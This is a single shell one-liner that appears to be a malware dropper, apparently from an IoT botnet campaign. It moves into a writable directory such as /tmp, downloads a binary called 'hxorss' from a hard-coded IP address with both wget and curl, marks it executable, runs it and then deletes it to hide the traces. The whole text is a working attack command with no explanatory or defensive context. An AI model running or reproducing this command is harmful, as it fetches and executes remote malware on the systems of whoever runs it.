cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.64/hxorss; curl -O http://185.165.29.64/hxorss; chmod +x hxorss; ./hxorss; rm -rf hxorss
